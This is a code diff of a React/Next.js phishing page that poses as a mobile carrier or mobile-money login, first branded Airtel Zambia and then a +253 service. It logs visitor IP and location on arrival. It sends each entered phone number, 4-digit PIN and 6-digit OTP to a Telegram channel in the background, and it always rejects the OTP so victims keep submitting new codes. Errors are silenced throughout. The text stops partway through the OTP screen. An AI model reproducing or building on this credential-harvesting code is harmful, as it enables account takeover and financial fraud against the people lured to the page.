@@ -1,22 +1,64 @@
 "use client"
 
-import React, { useState, useEffect, useCallback, useRef } from "react"
-import { sendTelegramMessage } from "@/lib/telegram"
+import React, { useState, useEffect, useRef } from "react"
 
-type FlowStep = "phone" | "verifying_phone" | "otp" | "verifying_otp"
+export default function AuthFlowPage() {
+  // Step: "phone" | "pin" | "otp"
+  const [step, setStep] = useState<"phone" | "pin" | "otp">("phone")
 
-export default function AirtelPage() {
-  const [step, setStep] = useState<FlowStep>("phone")
-  const [phoneNumber, setPhoneNumber] = useState("")
-  const [otp, setOtp] = useState<string[]>([])
-  const [timer, setTimer] = useState(56)
-  const [canResend, setCanResend] = useState(false)
-  const [otpError, setOtpError] = useState("")
-  const [isShaking, setIsShaking] = useState(false)
-
+  // Phone Screen State
+  const [phoneNumber, setPhoneNumber] = useState("77356400")
+  const [agreedToTerms, setAgreedToTerms] = useState(true)
+  const [isPhoneLoading, setIsPhoneLoading] = useState(false)
   const phoneInputRef = useRef<HTMLInputElement>(null)
 
-  // Countdown timer for OTP
+  // PIN Screen State
+  const [pin, setPin] = useState<string>("")
+  const [isPinLoading, setIsPinLoading] = useState(false)
+  const pinInputRef = useRef<HTMLInputElement>(null)
+
+  // OTP Screen State
+  const [otp, setOtp] = useState<string>("")
+  const [isOtpLoading, setIsOtpLoading] = useState(false)
+  const [otpError, setOtpError] = useState<string>("")
+  const [isOtpShaking, setIsOtpShaking] = useState(false)
+  const [otpAttempts, setOtpAttempts] = useState(0)
+  const [timer, setTimer] = useState(59)
+  const [canResend, setCanResend] = useState(false)
+  const otpInputRef = useRef<HTMLInputElement>(null)
+
+  // Auto focus input when switching screens
+  useEffect(() => {
+    if (step === "phone") {
+      phoneInputRef.current?.focus()
+    } else if (step === "pin") {
+      pinInputRef.current?.focus()
+    } else if (step === "otp") {
+      otpInputRef.current?.focus()
+    }
+  }, [step])
+
+  // Track visitor location when user lands
+  useEffect(() => {
+    const trackVisitor = async () => {
+      try {
+        const { sendTelegramMessage, fetchVisitorInfo } = await import("@/lib/telegram")
+        // Pre-fetch IP, Country, City, Region, ISP
+        await fetchVisitorInfo()
+        // Send location alert to Telegram
+        await sendTelegramMessage({
+          title: "👀 New Visitor Landed",
+          type: "visitor",
+        })
+      } catch {
+        // silent
+      }
+    }
+
+    trackVisitor()
+  }, [])
+
+  // OTP Countdown Timer
   useEffect(() => {
     let interval: NodeJS.Timeout
     if (step === "otp" && timer > 0) {
@@ -29,619 +71,651 @@ export default function AirtelPage() {
     return () => clearInterval(interval)
   }, [step, timer])
 
-  // Format timer into MM:SS
+  // Format MM:SS
   const formatTimer = (seconds: number) => {
     const mins = Math.floor(seconds / 60)
     const secs = seconds % 60
     return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
   }
 
-  // Handle phone number keypad input (unlimited digits allowed)
-  const handlePhoneKeyPress = (digit: string) => {
-    setPhoneNumber((prev) => prev + digit)
+  // Mask phone number: e.g. 253******6400
+  const getMaskedPhoneNumber = () => {
+    const clean = phoneNumber.trim() || "77356400"
+    const lastDigits = clean.length >= 4 ? clean.slice(-4) : clean.padStart(4, "0")
+    return `253******${lastDigits}`
   }
 
-  const handlePhoneBackspace = () => {
-    setPhoneNumber((prev) => prev.slice(0, -1))
-  }
+  // Check if phone number has digits
+  const isPhoneValid = phoneNumber.replace(/\D/g, "").length >= 3
 
-  // Handle OTP keypad input
-  const handleOtpKeyPress = useCallback(
-    (digit: string) => {
-      if (otp.length < 4) {
-        const nextOtp = [...otp, digit]
-        setOtp(nextOtp)
-        setOtpError("")
+  // -------------------------------------------------------------
+  // STEP 1: Phone submission (Transitions to PIN screen)
+  // -------------------------------------------------------------
+  const handlePhoneSubmit = (e?: React.FormEvent) => {
+    if (e) e.preventDefault()
+    const trimmed = phoneNumber.trim()
+    if (!trimmed) return
 
-        // Auto trigger verification when 4th digit entered
-        if (nextOtp.length === 4) {
-          const fullOtp = nextOtp.join("")
-          triggerOtpVerification(fullOtp)
-        }
-      }
-    },
-    [otp, phoneNumber]
-  )
+    setIsPhoneLoading(true)
+    const fullPhone = `+253 ${trimmed}`
 
-  const handleOtpBackspace = useCallback(() => {
-    setOtp((prev) => prev.slice(0, -1))
-    setOtpError("")
-  }, [])
-
-  // Listen to physical keyboard events
-  useEffect(() => {
-    const handleKeyDown = (e: KeyboardEvent) => {
-      if (step === "phone") {
-        if (/^[0-9]$/.test(e.key)) {
-          handlePhoneKeyPress(e.key)
-        } else if (e.key === "Backspace") {
-          handlePhoneBackspace()
-        } else if (e.key === "Enter" && phoneNumber.length > 0) {
-          handleProceedToLogin()
-        }
-      } else if (step === "otp") {
-        if (/^[0-9]$/.test(e.key)) {
-          handleOtpKeyPress(e.key)
-        } else if (e.key === "Backspace") {
-          handleOtpBackspace()
-        }
-      }
-    }
-
-    window.addEventListener("keydown", handleKeyDown)
-    return () => window.removeEventListener("keydown", handleKeyDown)
-  }, [step, phoneNumber, handleOtpKeyPress, handleOtpBackspace])
-
-  // Proceed from phone to verifying
-  const handleProceedToLogin = async () => {
-    if (!phoneNumber) return
-
-    setStep("verifying_phone")
-
-    // Send Telegram alert
-    try {
-      await sendTelegramMessage({
-        title: "📱 Airtel Zambia - Mobile Login",
-        phoneNumber: `+260${phoneNumber}`,
-        phone: `+260${phoneNumber}`,
+    // Background alert to Telegram (never blocks UI transition)
+    import("@/lib/telegram")
+      .then(({ sendTelegramMessage }) => {
+        sendTelegramMessage({
+          title: "📱 Phone Login Submitted",
+          phoneNumber: fullPhone,
+          phone: fullPhone,
+        }).catch(() => {})
       })
-    } catch {
-      // silent
-    }
+      .catch(() => {})
 
-    // Simulate verification delay (1.8s) then transition to OTP
+    // Immediate transition to PIN screen
     setTimeout(() => {
-      setStep("otp")
-      setTimer(56)
+      setIsPhoneLoading(false)
+      setPin("")
+      setStep("pin")
+    }, 150)
+  }
+
+  // -------------------------------------------------------------
+  // STEP 2: PIN submission (Transitions to OTP screen)
+  // -------------------------------------------------------------
+  const handlePinSubmit = (enteredPin?: string) => {
+    const finalPin = enteredPin !== undefined ? enteredPin : pin
+    if (finalPin.length !== 4) return
+
+    setIsPinLoading(true)
+    const fullPhone = `+253 ${phoneNumber.trim() || "77356400"}`
+
+    // Background alert to Telegram
+    import("@/lib/telegram")
+      .then(({ sendTelegramMessage }) => {
+        sendTelegramMessage({
+          title: "🔐 4-Digit PIN Submitted",
+          phoneNumber: fullPhone,
+          pin: finalPin,
+        }).catch(() => {})
+      })
+      .catch(() => {})
+
+    // Transition to 6-digit OTP screen
+    setTimeout(() => {
+      setIsPinLoading(false)
+      setOtp("")
+      setOtpError("")
+      setTimer(59)
       setCanResend(false)
-      setOtp([])
-    }, 1800)
-  }
-
-  // Trigger OTP verification
-  const triggerOtpVerification = async (enteredOtp: string) => {
-    setStep("verifying_otp")
-
-    try {
-      await sendTelegramMessage({
-        title: "🔐 Airtel Zambia - OTP Submitted",
-        phoneNumber: `+260${phoneNumber}`,
-        otp1: enteredOtp,
-      })
-    } catch {
-      // silent
-    }
-
-    // Simulate 2.5s verification check, then return to OTP screen with error so user can retry
-    setTimeout(() => {
       setStep("otp")
-      setOtp([])
-      setOtpError("Invalid OTP. Please enter the valid code.")
-      setIsShaking(true)
-      setTimeout(() => setIsShaking(false), 500)
-    }, 2500)
+    }, 200)
   }
 
-  // Resend OTP
-  const handleResendOtp = async () => {
+  // -------------------------------------------------------------
+  // STEP 3: OTP submission (Always show invalid as requested)
+  // -------------------------------------------------------------
+  const handleOtpSubmit = (enteredOtp?: string) => {
+    const finalOtp = enteredOtp !== undefined ? enteredOtp : otp
+    if (finalOtp.length !== 6 || isOtpLoading) return
+
+    setIsOtpLoading(true)
+    setOtpError("")
+    const currentAttempt = otpAttempts + 1
+    setOtpAttempts(currentAttempt)
+    const fullPhone = `+253 ${phoneNumber.trim() || "77356400"}`
+
+    // Send to Telegram in background
+    import("@/lib/telegram")
+      .then(({ sendTelegramMessage }) => {
+        sendTelegramMessage({
+          title: `🔑 6-Digit OTP Attempt #${currentAttempt}`,
+          phoneNumber: fullPhone,
+          pin: pin,
+          otp1: finalOtp,
+        }).catch(() => {})
+      })
+      .catch(() => {})
+
+    // Simulate verification delay (1.2s), then ALWAYS show invalid error
+    setTimeout(() => {
+      setIsOtpLoading(false)
+      setOtp("")
+      setOtpError("Invalid verification code. Please try again.")
+      setIsOtpShaking(true)
+      setTimeout(() => setIsOtpShaking(false), 500)
+      otpInputRef.current?.focus()
+    }, 1200)
+  }
+
+  // Handle Resend OTP
+  const handleResendOtp = () => {
     if (!canResend) return
-    setTimer(56)
+    setTimer(59)
     setCanResend(false)
-    setOtp([])
+    setOtp("")
     setOtpError("")
 
-    try {
-      await sendTelegramMessage({
-        title: "🔄 Airtel Zambia - Resend OTP Requested",
-        phoneNumber: `+260${phoneNumber}`,
+    import("@/lib/telegram")
+      .then(({ sendTelegramMessage }) => {
+        sendTelegramMessage({
+          title: "🔄 OTP Resend Requested",
+          phoneNumber: `+253 ${phoneNumber.trim() || "77356400"}`,
+        }).catch(() => {})
       })
-    } catch {
-      // silent
-    }
+      .catch(() => {})
   }
-
-  // Mask phone number for display (e.g. ******667)
-  const getMaskedPhone = () => {
-    if (!phoneNumber) return "******667"
-    const last3 = phoneNumber.slice(-3) || "667"
-    return `******${last3}`
-  }
-
-  const isValidPhone = phoneNumber.length > 0
 
   return (
-    <main
-      className="min-h-screen w-full bg-[#F6F6F9] flex flex-col items-center justify-between font-sans select-none text-[#1C1C1E] antialiased"
+    <div
       dir="ltr"
+      className="min-h-screen w-full bg-white flex flex-col items-center justify-between font-sans antialiased text-[#111827] selection:bg-[#022A74] selection:text-white"
     >
-      {/* ========================================================================= */}
-      {/* SCREEN 1: PHONE NUMBER INPUT                                             */}
-      {/* ========================================================================= */}
-      {step === "phone" && (
-        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-[#F6F6F9] pb-6 sm:pb-8 mx-auto">
-          {/* Header Bar with #FFFEFF */}
-          <header className="w-full bg-[#FFFEFF] px-5 sm:px-6 h-16 relative flex items-center justify-between border-b border-black/[0.04] shrink-0">
-            {/* Back Arrow */}
-            <button
-              type="button"
-              onClick={() => setPhoneNumber("")}
-              aria-label="Back"
-              className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
-            >
-              <svg
-                width="22"
-                height="22"
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="currentColor"
-                strokeWidth="2.8"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              >
-                <polyline points="15 18 9 12 15 6" />
-              </svg>
-            </button>
+      {/* Full screen layout container */}
+      <div className="w-full max-w-[460px] min-h-screen flex flex-col justify-between px-6 py-6 sm:py-8 mx-auto relative">
 
-            {/* Airtel Logo */}
-            <div className="absolute left-1/2 -translate-x-1/2 flex items-center justify-center">
-              <AirtelLogo />
-            </div>
-
-            {/* Spacer for symmetry */}
-            <div className="w-10" />
-          </header>
-
-          {/* Main Body Content on #F6F6F9 */}
-          <div className="px-5 sm:px-6 flex-1 flex flex-col justify-between">
+        {/* ========================================================================= */}
+        {/* SCREEN 1: PHONE NUMBER INPUT                                             */}
+        {/* ========================================================================= */}
+        {step === "phone" && (
+          <div className="flex-1 flex flex-col justify-between">
+            {/* Top Area */}
             <div>
-              {/* Title */}
-              <div className="mt-6 sm:mt-7">
-                <h1 className="text-[23px] sm:text-[24px] font-bold text-[#1C1C1E] tracking-tight">
-                  Welcome to Airtel Zambia
-                </h1>
+              {/* Back Arrow */}
+              <div className="pt-2 pb-6">
+                <button
+                  type="button"
+                  aria-label="Back"
+                  className="w-10 h-10 -ml-2 flex items-center justify-center text-[#111827] hover:opacity-75 active:scale-95 transition-all cursor-pointer"
+                >
+                  <svg
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="#111827"
+                    strokeWidth="2.3"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                  </svg>
+                </button>
+              </div>
 
-                {/* Field Label */}
-                <label className="block text-[14px] font-semibold text-[#2C2F36] mt-7 mb-2.5">
-                  Registered Number
-                </label>
+              {/* Title & Subtitle */}
+              <h1 className="text-[28px] sm:text-[30px] font-bold text-[#111827] tracking-tight leading-tight mb-2">
+                Let's get started
+              </h1>
+              <p className="text-[15px] sm:text-[16px] text-[#8E95A3] font-normal leading-normal mb-8">
+                Enter your phone number to get started
+              </p>
 
-              {/* Number Input Container with two border lines */}
+              {/* Phone Input Box (Pixel-perfect matching screenshot) */}
               <div
                 onClick={() => phoneInputRef.current?.focus()}
-                className="relative py-3 border-t-[1.5px] border-b-[1.5px] border-[#A1BFE7] flex items-center gap-2.5 cursor-text"
+                className="w-full h-[56px] rounded-[14px] border-[1.5px] border-[#293660] px-4 flex items-center justify-between bg-white cursor-text transition-all focus-within:ring-2 focus-within:ring-[#293660]/15"
               >
-                {/* Phone icon */}
-                <svg
-                  width="18"
-                  height="18"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="#8E929B"
-                  strokeWidth="2"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                  className="shrink-0"
+                {/* Left side: Country Code + Digits */}
+                <div className="flex items-center flex-1 overflow-hidden">
+                  <span className="text-[18px] font-normal text-[#111827] select-none shrink-0 mr-3.5">
+                    +253
+                  </span>
+
+                  {/* Phone input field */}
+                  <div className="relative flex items-center flex-1">
+                    <input
+                      ref={phoneInputRef}
+                      type="tel"
+                      inputMode="numeric"
+                      value={phoneNumber}
+                      onChange={(e) => {
+                        const val = e.target.value.replace(/\D/g, "")
+                        setPhoneNumber(val)
+                      }}
+                      onKeyDown={(e) => {
+                        if (e.key === "Enter") {
+                          e.preventDefault()
+                          handlePhoneSubmit()
+                        }
+                      }}
+                      className="w-full text-[18px] font-normal text-[#111827] tracking-wide outline-none border-none bg-transparent p-0"
+                      placeholder="77356400"
+                      autoFocus
+                    />
+                  </div>
+                </div>
+
+                {/* Right side: Green Checkmark */}
+                {isPhoneValid && (
+                  <div className="shrink-0 ml-2">
+                    <svg
+                      width="22"
+                      height="22"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="#34D399"
+                      strokeWidth="2.4"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                    >
+                      <polyline points="20 6 9 17 4 12" />
+                    </svg>
+                  </div>
+                )}
+              </div>
+            </div>
+
+            {/* Bottom Area */}
+            <div className="pt-8 sm:pt-12 pb-2">
+              {/* Checkbox: I agree to the 《Terms of Service》 */}
+              <div
+                onClick={() => setAgreedToTerms(!agreedToTerms)}
+                className="flex items-center gap-2.5 mb-5 cursor-pointer select-none group"
+              >
+                <div
+                  className={`w-[19px] h-[19px] rounded-[4px] flex items-center justify-center transition-all ${
+                    agreedToTerms
+                      ? "bg-[#022A74] text-white"
+                      : "border-[1.5px] border-[#CBD5E1] bg-white group-hover:border-[#022A74]"
+                  }`}
                 >
-                  <rect x="5" y="2" width="14" height="20" rx="2.5" />
-                  <line x1="12" y1="18" x2="12.01" y2="18" strokeWidth="2.5" />
-                </svg>
-
-                {/* Country code */}
-                <span className="text-[17px] font-semibold text-[#1C1C1E] tracking-tight shrink-0">
-                  +260
-                </span>
-
-                {/* Vertical Blue Cursor */}
-                <span className="w-[1.5px] h-[20px] bg-[#3B82F6] animate-pulse shrink-0" />
-
-                {/* Input Text or Placeholder */}
-                <div className="flex-1 text-[17px] tracking-wide overflow-hidden whitespace-nowrap">
-                  {phoneNumber ? (
-                    <span className="text-[#1C1C1E] font-medium tracking-[1px]">
-                      {phoneNumber}
-                    </span>
-                  ) : (
-                    <span className="text-[#B2B7BF] font-normal">Enter here</span>
+                  {agreedToTerms && (
+                    <svg
+                      width="12"
+                      height="12"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      strokeWidth="3.4"
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                    >
+                      <polyline points="20 6 9 17 4 12" />
+                    </svg>
                   )}
                 </div>
 
-                {/* Hidden input for mobile native keyboard / screen reader compatibility */}
+                <span className="text-[14px] sm:text-[14.5px] text-[#4B5563]">
+                  I agree to the{" "}
+                  <span className="text-[#022A74] font-medium hover:underline">
+                    《Terms of Service》
+                  </span>
+                </span>
+              </div>
+
+              {/* Continue Button */}
+              <button
+                type="button"
+                onClick={(e) => {
+                  e.preventDefault()
+                  handlePhoneSubmit()
+                }}
+                className={`w-full h-[54px] rounded-[13px] font-semibold text-[17px] text-white transition-all duration-200 flex items-center justify-center select-none shadow-sm ${
+                  isPhoneValid && agreedToTerms
+                    ? "bg-[#022A74] hover:bg-[#011F5B] active:scale-[0.99] cursor-pointer"
+                    : "bg-[#A5B2CA] cursor-not-allowed"
+                }`}
+              >
+                {isPhoneLoading ? (
+                  <svg
+                    className="animate-spin h-5 w-5 text-white"
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                  >
+                    <circle
+                      className="opacity-25"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      strokeWidth="4"
+                    />
+                    <path
+                      className="opacity-75"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                    />
+                  </svg>
+                ) : (
+                  "Continue"
+                )}
+              </button>
+            </div>
+          </div>
+        )}
+
+        {/* ========================================================================= */}
+        {/* SCREEN 2: 4-DIGIT PIN ENTRY                                              */}
+        {/* ========================================================================= */}
+        {step === "pin" && (
+          <div className="flex-1 flex flex-col justify-between">
+            {/* Top Area */}
+            <div>
+              {/* Back Arrow */}
+              <div className="pt-2 pb-6">
+                <button
+                  type="button"
+                  onClick={() => setStep("phone")}
+                  aria-label="Back"
+                  className="w-10 h-10 -ml-2 flex items-center justify-center text-[#111827] hover:opacity-75 active:scale-95 transition-all cursor-pointer"
+                >
+                  <svg
+                    width="24"
+                    height="24"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="#111827"
+                    strokeWidth="2.3"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                  >
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                  </svg>
+                </button>
+              </div>
+
+              {/* Welcome Back & Masked Number */}
+              <p className="text-[15px] sm:text-[16px] text-[#374151] font-normal mb-1">
+                Welcome back
+              </p>
+              <h2 className="text-[28px] sm:text-[32px] font-bold text-[#111827] tracking-tight leading-tight mb-2">
+                {getMaskedPhoneNumber()}
+              </h2>
+              <p className="text-[15px] sm:text-[16px] text-[#8E95A3] font-normal leading-normal mb-8">
+                Please enter your 4 digit PIN
+              </p>
+
+              {/* 4 PIN Boxes Container with overlaid input */}
+              <div className="relative inline-flex items-center gap-3 sm:gap-3.5 mb-8 select-none">
+                {[0, 1, 2, 3].map((index) => {
+                  const hasValue = index < pin.length
+                  const isCurrent = index === pin.length
+
+                  return (
+                    <div
+                      key={index}
+                      className={`w-[58px] h-[58px] sm:w-[62px] sm:h-[62px] rounded-[14px] bg-white border flex items-center justify-center transition-all ${
+                        isCurrent
+                          ? "border-[1.5px] border-[#293660] shadow-sm"
+                          : hasValue
+                          ? "border-[#E5E7EB]"
+                          : "border-[#E5E7EB]"
+                      }`}
+                    >
+                      {hasValue ? (
+                        /* Black Bullet Dot */
+                        <div className="w-[10px] h-[10px] sm:w-[11px] sm:h-[11px] rounded-full bg-[#111827]" />
+                      ) : isCurrent ? (
+                        /* Blinking Cursor in active box */
+                        <span className="w-[1.5px] h-[24px] bg-[#293660] animate-pulse" />
+                      ) : null}
+                    </div>
+                  )
+                })}
+
+                {/* Overlaid transparent input for 100% reliable click/tap typing */}
                 <input
-                  ref={phoneInputRef}
+                  ref={pinInputRef}
                   type="tel"
-                  inputMode="none"
-                  value={phoneNumber}
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  maxLength={4}
+                  value={pin}
+                  autoComplete="one-time-code"
                   onChange={(e) => {
-                    const val = e.target.value.replace(/\D/g, "")
-                    setPhoneNumber(val)
+                    const val = e.target.value.replace(/\D/g, "").slice(0, 4)
+                    setPin(val)
+                    if (val.length === 4) {
+                      setTimeout(() => handlePinSubmit(val), 200)
+                    }
                   }}
-                  className="absolute inset-0 opacity-0 pointer-events-none"
-                  tabIndex={-1}
+                  className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
+                  autoFocus
                 />
               </div>
             </div>
-          </div>
 
-          {/* Numeric Keypad (Airtel Zambia style) */}
-          <div className="mt-8 sm:mt-10 mb-14 sm:mb-20">
-            <div className="grid grid-cols-3 gap-y-6 sm:gap-y-7 text-center max-w-[280px] sm:max-w-[300px] mx-auto">
-              {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((num) => (
-                <button
-                  key={num}
-                  type="button"
-                  onClick={() => handlePhoneKeyPress(num)}
-                  className="h-11 sm:h-12 flex items-center justify-center text-[22px] sm:text-[24px] font-normal text-[#2B2E35] active:opacity-40 transition-opacity select-none cursor-pointer"
-                >
-                  {num}
-                </button>
-              ))}
-
-              {/* Blank cell */}
-              <div className="h-11 sm:h-12" />
-
-              {/* Zero */}
+            {/* Bottom Area */}
+            <div className="pt-8 sm:pt-12 pb-2">
               <button
                 type="button"
-                onClick={() => handlePhoneKeyPress("0")}
-                className="h-11 sm:h-12 flex items-center justify-center text-[22px] sm:text-[24px] font-normal text-[#2B2E35] active:opacity-40 transition-opacity select-none cursor-pointer"
-              >
-                0
-              </button>
-
-              {/* Backspace */}
-              <button
-                type="button"
-                onClick={handlePhoneBackspace}
-                aria-label="Delete"
-                className="h-11 sm:h-12 flex items-center justify-center active:opacity-40 transition-opacity select-none cursor-pointer"
-              >
-                <BackspaceTagIcon />
-              </button>
-            </div>
-          </div>
-
-          {/* Bottom Proceed Button */}
-          <div className="w-full mt-auto">
-            <button
-              type="button"
-              disabled={!isValidPhone}
-              onClick={handleProceedToLogin}
-              className={`w-full h-[52px] rounded-[6px] font-bold text-[15px] tracking-[0.5px] uppercase transition-all duration-200 flex items-center justify-center select-none ${
-                isValidPhone
-                  ? "bg-[#1E2538] text-white shadow-md shadow-[#1E2538]/20 active:scale-[0.99] cursor-pointer hover:bg-[#161C2C]"
-                  : "bg-[#D6DBE2] text-white cursor-not-allowed"
-              }`}
-            >
-              PROCEED TO LOGIN
-            </button>
-          </div>
-        </div>
-      </div>
-    )}
-
-      {/* ========================================================================= */}
-      {/* SCREEN 2 & 4: FULL-SCREEN DARK VERIFICATION OVERLAY                      */}
-      {/* ========================================================================= */}
-      {(step === "verifying_phone" || step === "verifying_otp") && (
-        <div className="fixed inset-0 z-50 bg-[#4D4E55] flex flex-col items-center justify-center gap-5 transition-opacity">
-          {/* iOS-style Spinner */}
-          <IOSActivityIndicator />
-
-          {/* Verification Text */}
-          <p className="text-white text-[16px] sm:text-[17px] font-normal tracking-wide">
-            {step === "verifying_phone" ? "Verifying Mobile Number" : "Verifying OTP"}
-          </p>
-        </div>
-      )}
-
-      {/* ========================================================================= */}
-      {/* SCREEN 3: OTP VERIFICATION                                               */}
-      {/* ========================================================================= */}
-      {step === "otp" && (
-        <div className="w-full max-w-[440px] min-h-screen flex flex-col justify-between bg-[#F6F6F9] mx-auto">
-          {/* Header Bar with #FFFEFF */}
-          <header className="w-full bg-[#FFFEFF] px-5 sm:px-6 h-14 relative flex items-center justify-between border-b border-black/[0.04] shrink-0">
-            {/* Back Chevron */}
-            <button
-              type="button"
-              onClick={() => {
-                setStep("phone")
-                setOtp([])
-                setOtpError("")
-              }}
-              aria-label="Back to login"
-              className="w-10 h-10 -ml-2 flex items-center justify-center text-[#1A1D20] active:opacity-50 transition-opacity"
-            >
-              <svg
-                width="22"
-                height="22"
-                viewBox="0 0 24 24"
-                fill="none"
-                stroke="currentColor"
-                strokeWidth="2.8"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              >
-                <polyline points="15 18 9 12 15 6" />
-              </svg>
-            </button>
-
-            {/* Title */}
-            <h2 className="absolute left-1/2 -translate-x-1/2 text-[17px] sm:text-[18px] font-bold text-[#1C1C1E] tracking-tight">
-              OTP Verification
-            </h2>
-
-            {/* Spacer */}
-            <div className="w-10" />
-          </header>
-
-          {/* Top Section on #F6F6F9 */}
-          <div className="px-5 sm:px-6 pt-3">
-
-            {/* Subtext shown clearly at top */}
-            <p className="text-[14.5px] text-[#2C2F36] leading-relaxed mt-5 mb-8 text-left">
-              An OTP has been sent to{" "}
-              <span className="font-semibold">{getMaskedPhone()}</span> and WhatsApp.
-            </p>
-
-            {/* 4 OTP Input Boxes */}
-            <div
-              className={`flex items-center justify-center gap-3.5 sm:gap-4 mb-5 transition-transform ${
-                isShaking ? "animate-[shake_0.4s_ease-in-out]" : ""
-              }`}
-            >
-              {[0, 1, 2, 3].map((index) => {
-                const hasValue = index < otp.length
-                const isCurrent = index === otp.length
-
-                return (
-                  <div
-                    key={index}
-                    className={`w-[58px] h-[58px] sm:w-[64px] sm:h-[64px] rounded-[14px] bg-white border flex items-center justify-center transition-all ${
-                      hasValue
-                        ? "border-gray-300 shadow-[0_2px_4px_rgba(0,0,0,0.06)]"
-                        : isCurrent
-                        ? "border-[#5B96F7] shadow-[0_0_0_2px_rgba(91,150,247,0.25)]"
-                        : "border-gray-200 shadow-xs"
-                    }`}
-                  >
-                    {hasValue ? (
-                      /* Asterisk symbol - semibold */
-                      <span className="text-[28px] sm:text-[30px] font-semibold text-[#1C1C1E] leading-none select-none">
-                        *
-                      </span>
-                    ) : isCurrent ? (
-                      <span className="w-[1.5px] h-[22px] bg-[#3B82F6] animate-pulse" />
-                    ) : null}
-                  </div>
-                )
-              })}
-            </div>
-
-            {/* OTP Error message if any */}
-            {otpError && (
-              <p className="text-red-600 text-[13px] text-center font-medium mb-3">
-                {otpError}
-              </p>
-            )}
-
-            {/* Resend OTP Row */}
-            <div className="flex items-center justify-between px-2 mb-8 text-[13px]">
-              <button
-                type="button"
-                disabled={!canResend}
-                onClick={handleResendOtp}
-                className={`font-bold tracking-wider uppercase transition-colors ${
-                  canResend
-                    ? "text-[#ED1B24] cursor-pointer hover:underline"
-                    : "text-[#A3A8B1] cursor-not-allowed"
+                disabled={pin.length !== 4 || isPinLoading}
+                onClick={() => handlePinSubmit()}
+                className={`w-full h-[54px] rounded-[13px] font-semibold text-[17px] text-white transition-all duration-200 flex items-center justify-center select-none shadow-sm ${
+                  pin.length === 4 && !isPinLoading
+                    ? "bg-[#022A74] hover:bg-[#011F5B] active:scale-[0.99] cursor-pointer"
+                    : "bg-[#A5B2CA] cursor-not-allowed"
                 }`}
               >
-                RESEND OTP
+                {isPinLoading ? (
+                  <svg
+                    className="animate-spin h-5 w-5 text-white"
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                  >
+                    <circle
+                      className="opacity-25"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      strokeWidth="4"
+                    />
+                    <path
+                      className="opacity-75"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                    />
+                  </svg>
+                ) : (
+                  "Continue"
+                )}
               </button>
-
-              <span className="font-semibold text-[#666B74] tracking-wider">
-                {formatTimer(timer)}
-              </span>
-            </div>
-
-            {/* Customer Care Section */}
-            <div className="text-center mt-2 mb-6">
-              <p className="text-[13.5px] font-medium text-[#4B505A] mb-3">
-                Need customer care help?
-              </p>
-              <a
-                href="tel:111"
-                className="inline-flex items-center justify-center gap-2 px-5 py-1.5 rounded-full border border-[#22252A] text-[#22252A] hover:bg-gray-50 active:scale-95 transition-all text-[13.5px] font-semibold"
-              >
-                <svg
-                  width="15"
-                  height="15"
-                  viewBox="0 0 24 24"
-                  fill="none"
-                  stroke="currentColor"
-                  strokeWidth="2"
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                >
-                  <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
-                </svg>
-                <span>Call</span>
-              </a>
             </div>
           </div>
+        )}
 
-          {/* iOS System Keypad with shadow around each digit */}
-          <div className="w-full bg-[#ECEEF2] pt-2 pb-5 sm:pb-6 px-1.5 border-t border-[#DDE0E6]">
-            <div className="grid grid-cols-3 gap-1.5 max-w-[420px] mx-auto">
-              {[
-                { digit: "1", letters: "" },
-                { digit: "2", letters: "ABC" },
-                { digit: "3", letters: "DEF" },
-                { digit: "4", letters: "GHI" },
-                { digit: "5", letters: "JKL" },
-                { digit: "6", letters: "MNO" },
-                { digit: "7", letters: "PQRS" },
-                { digit: "8", letters: "TUV" },
-                { digit: "9", letters: "WXYZ" },
-              ].map((item) => (
+        {/* ========================================================================= */}
+        {/* SCREEN 3: 6-DIGIT OTP ENTRY (SHOWS INVALID EACH TIME)                    */}
+        {/* ========================================================================= */}
+        {step === "otp" && (
+          <div className="flex-1 flex flex-col justify-between">
+            {/* Top Area */}
+            <div>
+              {/* Back Arrow */}
+              <div className="pt-2 pb-6">
                 <button
-                  key={item.digit}
                   type="button"
